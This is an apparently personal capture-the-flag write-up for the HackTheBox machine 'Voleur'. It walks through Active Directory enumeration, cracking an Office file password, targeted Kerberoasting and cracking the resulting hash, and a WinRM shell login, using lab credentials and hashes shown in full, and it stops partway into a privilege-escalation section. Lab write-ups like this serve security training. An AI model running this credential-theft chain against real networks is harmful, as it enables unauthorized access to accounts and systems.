---
title: "HTB - Voleur Writeup"
date: 2026-11-20 09:22:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, medium]
---
## P0
First of all, we will use rustscan to find out all opened ports of this machine:
```
└─$ rustscan -a 10.129.232.130 -b 100 --ulimit 500 --scan-order "serial" --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 500.
Open 10.129.232.130:53
Open 10.129.232.130:88
Open 10.129.232.130:135
Open 10.129.232.130:139
Open 10.129.232.130:389
Open 10.129.232.130:445
Open 10.129.232.130:464
Open 10.129.232.130:593
Open 10.129.232.130:636
Open 10.129.232.130:2222
Open 10.129.232.130:3269
Open 10.129.232.130:3268
Open 10.129.232.130:5985
Open 10.129.232.130:9389
Open 10.129.232.130:49664
Open 10.129.232.130:49668
Open 10.129.232.130:56510
Open 10.129.232.130:58485
Open 10.129.232.130:58486
Open 10.129.232.130:58488
Open 10.129.232.130:58511
10.129.232.130 -> [53,88,135,139,389,445,464,593,636,2222,3269,3268,5985,9389,49664,49668,56510,58485,58486,58488,58511]

```
Next, I will use nmap to get more details information about those opened ports:
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p53,88,135,139,389,445,464,593,636,2222,3269,3268,5985,9389,49664,49668,56510,58485,58486,58488,58511 -oN 10.129.232.130_nmap 10.129.232.130
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-19 21:40 -0500
Nmap scan report for 10.129.232.130 (10.129.232.130)
Host is up (0.055s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-20 10:38:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56510/tcp open  msrpc         Microsoft Windows RPC
58485/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58486/tcp open  msrpc         Microsoft Windows RPC
58488/tcp open  msrpc         Microsoft Windows RPC
58511/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-11-20T10:39:40
|_  start_date: N/A
|_clock-skew: 7h58m29s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 58488/tcp)
HOP RTT      ADDRESS
1   56.84 ms 10.10.14.1 (10.10.14.1)
2   56.90 ms 10.129.232.130 (10.129.232.130)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.95 seconds
```
## P1
Firstly, from nmap result, we realize this machine has active directory signature :D. So we will add its domain to `/etc/hosts`:
```
└─$ cat /etc/hosts        
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.232.130 voleur.htb
```
Now, we will first look at `port 53`:
```
└─$ dig NS voleur.htb @10.129.232.130       

; <<>> DiG 9.20.23-1-Debian <<>> NS voleur.htb @10.129.232.130
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 53037
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;voleur.htb.                    IN      NS

;; ANSWER SECTION:
voleur.htb.             3600    IN      NS      dc.voleur.htb.

;; ADDITIONAL SECTION:
dc.voleur.htb.          3600    IN      A       10.129.232.130

;; Query time: 60 msec
;; SERVER: 10.129.232.130#53(10.129.232.130) (UDP)
;; WHEN: Thu Nov 19 22:07:10 EST 2026
;; MSG SIZE  rcvd: 72
```
Wow, continue to add `dc.voleur.htb` to `/etc/hosts`
```
└─$ cat /etc/hosts        
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.232.130 voleur.htb dc.voleur.htb
```
We move to SMB service on `port 445`:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt'         
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```
This machine seems to block NLTM Authentication, so we change to Kerberos authentication:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.232.130  445    DC               [*] Enumerated shares
SMB         10.129.232.130  445    DC               Share           Permissions            Remark
SMB         10.129.232.130  445    DC               -----           -----------            ------
SMB         10.129.232.130  445    DC               ADMIN$                                 Remote Admin
SMB         10.129.232.130  445    DC               C$                                     Default share
SMB         10.129.232.130  445    DC               Finance                                
SMB         10.129.232.130  445    DC               HR                                     
SMB         10.129.232.130  445    DC               IPC$            READ                   Remote IPC
SMB         10.129.232.130  445    DC               IT              READ                   
SMB         10.129.232.130  445    DC               NETLOGON        READ                   Logon server share 
SMB         10.129.232.130  445    DC               SYSVOL          READ                   Logon server share 
```
Great sign, we have `READ` permisson on `IT` share. So we can use `nxc smb` to enumerate it:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --spider 'IT' --pattern '.'
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.232.130  445    DC               [*] Spidering .
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/.. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/First-Line Support/. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/First-Line Support/.. [dir]
SMB         10.129.232.130  445    DC               //10.129.232.130/IT/First-Line Support/Access_Review.xlsx [lastm:'2025-05-29 18:23' size:16896]
```
Next we will download `ACcess_Review.xlsx` to our local attack host and read it:
```
└─$ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --share 'IT' --get-file '/First-Line Support/Access_Review.xlsx' 'Access_review.xlsx'
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.232.130  445    DC               [*] Copying '/First-Line Support/Access_Review.xlsx' to 'Access_review.xlsx'
SMB         10.129.232.130  445    DC               [+] File '/First-Line Support/Access_Review.xlsx' was downloaded to 'Access_review.xlsx'
```
Unfortunately, this file has password blocked. So we must find out its password:

![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_11-35){: w="700" }

Okey, a password, so I fastly think to `hashcat` :D. But first of all we need to convert that password to a format which hascat can understand. I will use `office2john` tool:
```
└─$ office2john Access_review.xlsx                                                
Access_review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```
```
.\hashcat.exe -a 0 -m 9600 '$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c' ..\own-wordlist\rockyou.txt
```
```
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1
```

![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_12-23){: w="700" }

## P2
`As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt`<br>

At this present, this machine gives us a valid credential `ryan.naylor / HollowOct31Nyt`. So we can start `rusthound` first to gather available AD information:
```
└─$ rusthound-ce -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -z        

---------------------------------------------------
Initializing RustHound-CE at 21:48:37 on 11/19/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-20T02:48:37Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-20T02:48:37Z INFO  rusthound_ce] Collection method: All
[2026-11-20T02:48:37Z INFO  rusthound_ce::ldap] Connected to VOLEUR.HTB Active Directory!
[2026-11-20T02:48:37Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-11-20T02:48:37Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=voleur,DC=htb
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=voleur,DC=htb
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=voleur,DC=htb
[2026-11-20T02:48:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:41Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=voleur,DC=htb
[2026-11-20T02:48:41Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-20T02:48:43Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=voleur,DC=htb
[2026-11-20T02:48:43Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 37%                                                                                                                                                                  [2026-11-20T02:48:43Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10                                                                                                           
[2026-11-20T02:48:43Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 5 ous parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-11-20T02:48:43Z INFO  rusthound_ce::json::maker::common] .//20261119214843_voleur-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 21:48:43 on 11/19/26! Happy Graphing!
```
Cool ! Now import all rusthound result to bloodhound GUI and start your detective job !

![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_15-04){: w="700" }

```
└─$ nxc smb 10.129.232.130 -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k 
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
```
```
└─$ nxc ldap 10.129.232.130 -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k --targeted-kerberoast 'svc_winrm' --kerberoast svc_winrm_st
LDAP        10.129.232.130  389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.232.130  389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        10.129.232.130  389    DC               [+] Found 1 enabled users without SPN.
LDAP        10.129.232.130  389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 04:10:12.398769, lastLogon: 2025-01-29 10:07:32.711487
LDAP        10.129.232.130  389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$0c091dd2a359a3f2f9e7ac9ceb9d684f$2f2450beb78b62206ec9a772e27e7624bbaf304c20056c66f4e79414d227d239c0867e47496e05958d2f106e45f73e8eb961e1693cb61d8aa82301981ae5611845f9a5b328bb1d61a6b559bf0002b93f972d0301f6125e126b5f1f62946d28a6c9af34b9ce35d3ffd1ff22d5a225075617b9476419d611706a86f5e0e598a62c5e875a3175bb3a0fe9336759d5e95d308f6e6f20bf8e77066020ac7c07c12dbe8a6cd1bf62769bd3709737a2180f3c215694dfcf390cc003eaaf0e5c918c841161b4a1bc3dbe1da750bf6eadd25d7426dc8d07055bba13419faa128d372fa6fa2a1ff99048587f5c9d96d890572044a98efeb9b4f51a6eaad091ff9cec91bf86f0b778a97ed28f2889fd766cf56ad9eb4ae008f73975defba2488309bb70ddf37533d4c68eeefcbefde36ddf904d0790f96799ab5376ac25f7c9b3463c867c9364c5f8c8b2dfea288810636c3e066b9fd926acd34a7c781a3df2fdff039ff14707741f4138a29ae0ca322e8910120f72faebe59da7f32bd545e0f6cb8802579e2c18cb17cf0ecdd4a6225a2518afc09dc2c12b9687779c515126f2a27b4cafd021aec4ba1fb647797b4564b36064d9c2421f6d887721f4b960210bbdca93492e13bf661141c9b7c450d74d756f0befd9887e70f30ea45db097adab19b29df436ad7bd3a584fd4d64ed2e6693c9aa5b80f98476e20ddffbec33fbfa850ba291e09edf22ff998499c6b11c9db41aa427750b3b461f9f7eefc0f65747df3a5efee86988e236010516382e4760f107603d0daefe93d0debd9845326758e3a8ddfbf3fa0f25e8fe6f69c7f51dc28fa2debeb79a787048dd73d9e037ca295f13aa186cd4b6b6aa5f8b6ed6c426f01d3346f9974a873e145db8dfc7b9cef1d0d26a0f54fc9754cfc1089e9f7ae40f18068aa90bf74d91fbc9b6b6a5d3910559436aeb784247edf60da58b1554a0af19fb1146d882bd9c82b4506270d6a84c17fbde3bd5fbb9d2dccfdb7034b09a188ae14bb34549a71ac532fa51507fa954fd05b61e697720eb7748abf8235594e1f9f9f312d60d8e6a9da10195b7c6d915645afcfac393727a6f037640a94e814759449bdb180bce6d145650bd0d9892b588aa519855ab47bc7892c66eca3b68b1cdaa4965953fb37d15457d9326a3fa3aa31992ca363d52b2f7269c7edd4435ee8ec78eb9fa9c7691be7823856b503339d51d4fa285752049f8621796e423264796d5e3813a0eefdf810ea7d7e514836b9e5ce2aafdcd9f0b823a343fe7a76e441d82604d887245831c46a8e9ee90772d4d725d3e8901f8a1728141ff125289da09ec088d72ded9e3e763fa92e5e24944e08fcb8a71c09cd57a2be48cf71fee62b8d9398896e71c5a9e6a337dc8efd40041e127e79727ed6202854bfa63ff57100f50ffe4bc0a48bf6d0be7b269b1435fea794afcdccc944b485e3c53f2da2a416b8fd04c2767b650f591049ea2399b261608dd6b44f90455
```
```
.\hashcat.exe -a 0 -m 13100 '$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$0c091dd2a359a3f2f9e7ac9ceb9d684f$2f2450beb78b62206ec9a772e27e7624bbaf304c20056c66f4e79414d227d239c0867e47496e05958d2f106e45f73e8eb961e1693cb61d8aa82301981ae5611845f9a5b328bb1d61a6b559bf0002b93f972d0301f6125e126b5f1f62946d28a6c9af34b9ce35d3ffd1ff22d5a225075617b9476419d611706a86f5e0e598a62c5e875a3175bb3a0fe9336759d5e95d308f6e6f20bf8e77066020ac7c07c12dbe8a6cd1bf62769bd3709737a2180f3c215694dfcf390cc003eaaf0e5c918c841161b4a1bc3dbe1da750bf6eadd25d7426dc8d07055bba13419faa128d372fa6fa2a1ff99048587f5c9d96d890572044a98efeb9b4f51a6eaad091ff9cec91bf86f0b778a97ed28f2889fd766cf56ad9eb4ae008f73975defba2488309bb70ddf37533d4c68eeefcbefde36ddf904d0790f96799ab5376ac25f7c9b3463c867c9364c5f8c8b2dfea288810636c3e066b9fd926acd34a7c781a3df2fdff039ff14707741f4138a29ae0ca322e8910120f72faebe59da7f32bd545e0f6cb8802579e2c18cb17cf0ecdd4a6225a2518afc09dc2c12b9687779c515126f2a27b4cafd021aec4ba1fb647797b4564b36064d9c2421f6d887721f4b960210bbdca93492e13bf661141c9b7c450d74d756f0befd9887e70f30ea45db097adab19b29df436ad7bd3a584fd4d64ed2e6693c9aa5b80f98476e20ddffbec33fbfa850ba291e09edf22ff998499c6b11c9db41aa427750b3b461f9f7eefc0f65747df3a5efee86988e236010516382e4760f107603d0daefe93d0debd9845326758e3a8ddfbf3fa0f25e8fe6f69c7f51dc28fa2debeb79a787048dd73d9e037ca295f13aa186cd4b6b6aa5f8b6ed6c426f01d3346f9974a873e145db8dfc7b9cef1d0d26a0f54fc9754cfc1089e9f7ae40f18068aa90bf74d91fbc9b6b6a5d3910559436aeb784247edf60da58b1554a0af19fb1146d882bd9c82b4506270d6a84c17fbde3bd5fbb9d2dccfdb7034b09a188ae14bb34549a71ac532fa51507fa954fd05b61e697720eb7748abf8235594e1f9f9f312d60d8e6a9da10195b7c6d915645afcfac393727a6f037640a94e814759449bdb180bce6d145650bd0d9892b588aa519855ab47bc7892c66eca3b68b1cdaa4965953fb37d15457d9326a3fa3aa31992ca363d52b2f7269c7edd4435ee8ec78eb9fa9c7691be7823856b503339d51d4fa285752049f8621796e423264796d5e3813a0eefdf810ea7d7e514836b9e5ce2aafdcd9f0b823a343fe7a76e441d82604d887245831c46a8e9ee90772d4d725d3e8901f8a1728141ff125289da09ec088d72ded9e3e763fa92e5e24944e08fcb8a71c09cd57a2be48cf71fee62b8d9398896e71c5a9e6a337dc8efd40041e127e79727ed6202854bfa63ff57100f50ffe4bc0a48bf6d0be7b269b1435fea794afcdccc944b485e3c53f2da2a416b8fd04c2767b650f591049ea2399b261608dd6b44f90455' ..\own-wordlist\rockyou.txt
```
```
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$0c091dd2a359a3f2f9e7ac9ceb9d684f$2f2450beb78b62206ec9a772e27e7624bbaf304c20056c66f4e79414d227d239c0867e47496e05958d2f106e45f73e8eb961e1693cb61d8aa82301981ae5611845f9a5b328bb1d61a6b559bf0002b93f972d0301f6125e126b5f1f62946d28a6c9af34b9ce35d3ffd1ff22d5a225075617b9476419d611706a86f5e0e598a62c5e875a3175bb3a0fe9336759d5e95d308f6e6f20bf8e77066020ac7c07c12dbe8a6cd1bf62769bd3709737a2180f3c215694dfcf390cc003eaaf0e5c918c841161b4a1bc3dbe1da750bf6eadd25d7426dc8d07055bba13419faa128d372fa6fa2a1ff99048587f5c9d96d890572044a98efeb9b4f51a6eaad091ff9cec91bf86f0b778a97ed28f2889fd766cf56ad9eb4ae008f73975defba2488309bb70ddf37533d4c68eeefcbefde36ddf904d0790f96799ab5376ac25f7c9b3463c867c9364c5f8c8b2dfea288810636c3e066b9fd926acd34a7c781a3df2fdff039ff14707741f4138a29ae0ca322e8910120f72faebe59da7f32bd545e0f6cb8802579e2c18cb17cf0ecdd4a6225a2518afc09dc2c12b9687779c515126f2a27b4cafd021aec4ba1fb647797b4564b36064d9c2421f6d887721f4b960210bbdca93492e13bf661141c9b7c450d74d756f0befd9887e70f30ea45db097adab19b29df436ad7bd3a584fd4d64ed2e6693c9aa5b80f98476e20ddffbec33fbfa850ba291e09edf22ff998499c6b11c9db41aa427750b3b461f9f7eefc0f65747df3a5efee86988e236010516382e4760f107603d0daefe93d0debd9845326758e3a8ddfbf3fa0f25e8fe6f69c7f51dc28fa2debeb79a787048dd73d9e037ca295f13aa186cd4b6b6aa5f8b6ed6c426f01d3346f9974a873e145db8dfc7b9cef1d0d26a0f54fc9754cfc1089e9f7ae40f18068aa90bf74d91fbc9b6b6a5d3910559436aeb784247edf60da58b1554a0af19fb1146d882bd9c82b4506270d6a84c17fbde3bd5fbb9d2dccfdb7034b09a188ae14bb34549a71ac532fa51507fa954fd05b61e697720eb7748abf8235594e1f9f9f312d60d8e6a9da10195b7c6d915645afcfac393727a6f037640a94e814759449bdb180bce6d145650bd0d9892b588aa519855ab47bc7892c66eca3b68b1cdaa4965953fb37d15457d9326a3fa3aa31992ca363d52b2f7269c7edd4435ee8ec78eb9fa9c7691be7823856b503339d51d4fa285752049f8621796e423264796d5e3813a0eefdf810ea7d7e514836b9e5ce2aafdcd9f0b823a343fe7a76e441d82604d887245831c46a8e9ee90772d4d725d3e8901f8a1728141ff125289da09ec088d72ded9e3e763fa92e5e24944e08fcb8a71c09cd57a2be48cf71fee62b8d9398896e71c5a9e6a337dc8efd40041e127e79727ed6202854bfa63ff57100f50ffe4bc0a48bf6d0be7b269b1435fea794afcdccc944b485e3c53f2da2a416b8fd04c2767b650f591049ea2399b261608dd6b44f90455:AFireInsidedeOzarctica980219afi
```
```
└─$ nxc smb 10.129.232.130 -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -k
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.130  445    DC               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
```
```
└─$ impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```
```
└─$ evil-winrm -i dc.voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -K svc_winrm.ccache -r VOLEUR.HTB
                                        
Evil-WinRM shell v3.9
                                        
Warning: KRB5CCNAME is already set to: /home/kali/htb/svc_winrm.ccache. Using existing value instead of /home/kali/htb/svc_winrm.ccache
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
```
```
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---        11/20/2026   2:20 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
```
## P3
```
└─$ bloodyAD --host dc.voleur.htb --dc-ip 10.129.232.130 -d voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k ccache=svc_ldap.ccache set restore 'todd.wolfe'
[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```